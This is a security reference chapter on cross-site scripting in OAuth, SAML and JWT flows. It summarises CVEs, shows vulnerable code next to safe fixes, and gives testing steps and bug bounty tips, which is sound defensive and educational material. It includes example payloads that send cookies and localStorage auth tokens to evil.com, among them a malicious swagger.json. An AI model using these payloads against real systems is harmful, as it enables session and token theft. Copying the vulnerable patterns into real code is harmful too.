# 63 - OAuth, JWT, and SAML XSS Vectors

## Overview

Authentication and authorization protocols introduce XSS through:
- OAuth redirect_uri manipulation with javascript:/data: schemes
- SAML RelayState parameter reflection in SSO flows
- JWT claim rendering in client-side templates without encoding
- API key leakage via XSS on API documentation pages
- State parameter reflection in OAuth callbacks
- Open redirect chaining to steal authorization codes

## OAuth redirect_uri XSS

### Backstage Auth Backend (CVE-2026-32235)

**CVE-2026-32235:** Affects `@backstage/plugin-auth-backend` before 0.27.1. CVSS 5.9. A crafted URI passes allowlist verification while resolving to the attacker's host, enabling authorization code theft.

### better-auth javascript: URI Stored XSS

The better-auth library (pre-1.6.13) oidc-provider and mcp plugins failed to validate the scheme of `redirect_uri` values registered by clients. An attacker could register a client with a `javascript:` redirect_uri, which the authorization server returned unchanged. When a consent page assigned the returned value to `window.location.href`, attacker script executed in the authorization server's origin.

Fixed by rejecting `javascript:`, `data:`, and `vbscript:` schemes at registration.

### Spotipy OAuth Callback XSS (CVE-2025-66040)

**CVE-2025-66040:** An unsanitized error parameter in the library's local OAuth callback server allowed attackers to execute JavaScript in the user's browser during OAuth authentication.

### Open Redirect Chaining

When a registered redirect_uri domain hosts an open redirector, the authorization server approves the request and never sees the second hop. The attacker receives the authorization code or token via the chained redirect.

```javascript
// VULNERABLE: Open redirect on callback domain
app.get('/redirect', (req, res) => {
  res.redirect(req.query.url);  // Open redirector on registered callback domain
});
// Attacker registers: https://app.example.com/redirect?url=https://evil.com
// Auth server approves because domain matches, code leaks to evil.com

// VULNERABLE: State parameter rendered without encoding
app.get('/oauth/callback', (req, res) => {
  const { code, state } = req.query;
  // state was set by attacker: <img src=x onerror=alert(document.cookie)>
  res.send(`<p>Authenticating... State: ${state}</p>`);
});
```

### URI Scheme Abuse

`javascript:` and `data:` schemes in redirect_uri can trigger XSS if the authorization server does not block non-HTTPS schemes.

### Parameter Pollution in redirect_uri

A 2023 ACM paper finds that the RFC leaves redirect_uri open to parameter pollution attacks, where duplicated security-sensitive parameters exploit parsing differences between the authorization server and client.

### PKCE Limitations

PKCE prevents authorization code interception but does not prevent XSS on the callback page. An XSS on the callback page can read the code from the URL before the legitimate client exchanges it.

## SAML RelayState XSS

### OpenVPN (CVE-2025-50055)

**CVE-2025-50055:** The SAML module lets a configured remote ACS endpoint inject script or HTML through the RelayState parameter. CVSS 6.4 (Medium). Affected versions: 2.14.0 through 2.14.3.

### Citrix NetScaler (CVE-2025-12101)

**CVE-2025-12101:** Reflected XSS in RelayState at the `/cgi/logout` endpoint. The attack can be carried out via CSRF since the endpoint accepts HTTP POST requests with a valid SAMLResponse and a modified RelayState.

```html
<!-- VULNERABLE: RelayState rendered without encoding after SAML SSO -->
@app.route('/saml/acs', methods=['POST'])
def saml_acs():
    relay_state = request.form.get('RelayState', '/')
    # After SAML validation, redirect or render RelayState
    return f'<p>Redirecting to: {relay_state}</p>'
    # Payload: RelayState=<script>alert(1)</script>

<!-- VULNERABLE: NameID rendered in profile -->
<h2>Welcome, {{ saml_attributes.nameID }}</h2>
<!-- If NameID = "<img src=x onerror=alert(1)>" and template
     does not auto-escape -->
```

### SAML Signature Bypass to Stored XSS Chain

**CVE-2024-45409 (ruby-saml, GitLab):** XML signature wrapping flaw. The signature validates one element while the application reads NameID from another, allowing a forged NameID. CVSS 10.0. A forged NameID rendered in a user profile page without encoding becomes stored XSS.

The combination of SAML authentication bypass and stored XSS (via forged NameID) is a high-impact attack chain: the attacker gains authenticated access AND plants persistent XSS.

### NameID Format Abuse

NameID values set to `urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified` allow arbitrary strings. If these strings contain HTML/JavaScript and are rendered without encoding, stored XSS results.

## JWT Claim Rendering XSS

JWT claims (name, email, profile URL) are base64-encoded but not encrypted. They are frequently rendered in HTML without sanitization. No specific CVE was found for JWT claim XSS, but the pattern is well-documented.

```javascript
// VULNERABLE: JWT claim rendered via innerHTML
const token = localStorage.getItem('jwt');
const payload = JSON.parse(atob(token.split('.')[1]));
document.getElementById('welcome').innerHTML = `Welcome, ${payload.name}!`;
// If payload.name = "<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>"
// XSS executes on every page load

// SAFE: Use textContent
document.getElementById('welcome').textContent = `Welcome, ${payload.name}!`;

// SAFE (React): Use JSX auto-escaping
function Welcome({ user }) {
  return <h1>Welcome, {user.name}!</h1>;  // Auto-escaped by React
}
```

### Self-Reinforcing JWT XSS

The combination of JWT claim XSS and localStorage token storage creates a self-reinforcing attack: the XSS payload in a claim executes on render and can steal the JWT from localStorage, enabling lateral movement.

### Token Theft via XSS

JWTs stored in localStorage are accessible to any JavaScript on the page. An XSS that reads localStorage can steal the JWT and impersonate the user. HttpOnly cookies prevent this.

## API Key Leakage via XSS

### Swagger UI Token Theft Chain

The Swagger UI XSS-to-token-theft chain:
1. Load malicious API spec in Swagger UI
2. DOM XSS fires via DOMPurify bypass
3. Injected script reads auth token from localStorage
4. Token exfiltrated to attacker

```javascript
// Attack: Malicious swagger.json with XSS payload
{
  "info": {
    "description": "<img src=x onerror='fetch(`https://evil.com/steal?token=${localStorage.getItem(\"authToken\")}`)'>"
  }
}
// When victim loads this spec in Swagger UI < 3.38.0, the XSS fires
// and exfiltrates the auth token from localStorage
```

### Error Message Key Reflection

API error messages that reflect API keys (e.g., "Invalid API key: sk-abc123...") create a leakage path. If the error page is vulnerable to XSS, the key can be exfiltrated.

```javascript
// VULNERABLE: Error message reflecting API key
app.use((err, req, res, next) => {
  if (err.type === 'auth') {
    res.status(401).send(
      `Invalid API key: ${req.headers.authorization}`
    );
  }
});
```

### Bearer Token Model Risk

The bearer model means any process holding a copy of the key can use it. Keys often have no expiration, so a stolen key can be used indefinitely.

## OAuth XSS + Token Theft Chains

DOM-based XSS can be chained with OAuth login flows to bypass HTTP-only cookies and extract tokens. HTTP-only cookies block direct JavaScript access to cookie values but do not prevent script execution or malicious redirects.

**Feathers.js (CVE-2026-27191):** Concatenating a user-supplied `redirect` parameter onto a base origin allowed attackers to alter the URL authority during callback handling, leading to token leakage via open redirect.

## Testing Methodology

1. **Test redirect_uri** with `javascript:`, `data:`, and `vbscript:` schemes
2. **Check SAML RelayState** rendering on ACS and logout endpoints
3. **Inspect JWT claims** -- are they rendered via innerHTML or textContent?
4. **Check localStorage** for API keys, JWTs, and auth tokens
5. **Test OAuth state parameter** reflection in callback pages
6. **Look for open redirectors** on registered OAuth callback domains
7. **Check SAML NameID** handling -- is it rendered without encoding?
8. **Test Swagger UI** for XSS via remote spec loading
9. **Check error messages** for API key reflection

## Bug Bounty Tips

1. RelayState XSS is the most accessible SAML XSS vector -- often treated as a trusted redirect URL
2. SAML signature bypass + stored XSS via forged NameID is a Critical chain
3. PKCE mitigates code interception but not XSS on the callback page
4. The state parameter is an underappreciated XSS vector -- developers assume it is "their" data
5. JWT claim XSS + localStorage token storage creates a self-reinforcing attack loop
6. API documentation pages (Swagger UI) are high-value targets because they store auth credentials
7. The shift from API keys to OAuth tokens does not eliminate risk if tokens are in localStorage
8. Exact-match redirect_uri validation is necessary but not sufficient -- the domain must also be free of open redirectors
